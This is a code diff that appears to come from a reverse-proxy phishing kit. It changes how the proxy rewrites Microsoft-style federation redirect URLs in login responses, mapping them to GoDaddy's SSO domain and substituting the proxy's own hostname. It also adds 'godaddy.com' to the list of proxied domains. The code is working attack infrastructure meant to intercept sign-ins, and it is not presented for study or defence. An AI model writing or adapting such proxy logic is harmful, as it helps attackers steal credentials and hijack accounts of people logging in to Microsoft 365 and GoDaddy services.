@@ -78,11 +78,21 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                 if (this.proxyResp.headers['content-type'].startsWith('application/json')) {
                     const JObjBody = JSON.parse(newMsgBody)
                     if (JObjBody.hasOwnProperty('Credentials')) {
+                        const hostDomain = this.browserEndPoint.clientContext.hostname
                         const fedUrl = JObjBody.Credentials.FederationRedirectUrl
                         if (fedUrl) {
-                             const fedObj = new URL(fedUrl)
-                            const newFedDomain = fedObj.hostname
+                            let newFedDomain
+                            if (fedUrl.startsWith(`https://${hostDomain}`)) {
+                                newFedDomain = 'sso.godaddy.com'
+                            }
+                            else {
+                                const fedObj = new URL(fedUrl)
+                                
+                                newFedDomain = fedObj.hostname
+                            }
+                           
                             console.log('fed domain is ' + newFedDomain)
+                            
                             this.browserEndPoint.clientContext.currentDomain = newFedDomain
                             newMsgBody = newMsgBody.replace(newFedDomain, this.browserEndPoint.clientContext.hostname)
                         }
@@ -149,6 +159,7 @@ const configExport = {
         // 'login.live.com',
         // 'aadcdn.msftauth.net',
         'sso.godaddy.com',
+        'godaddy.com'
         ],
 
     PRE_HANDLERS:
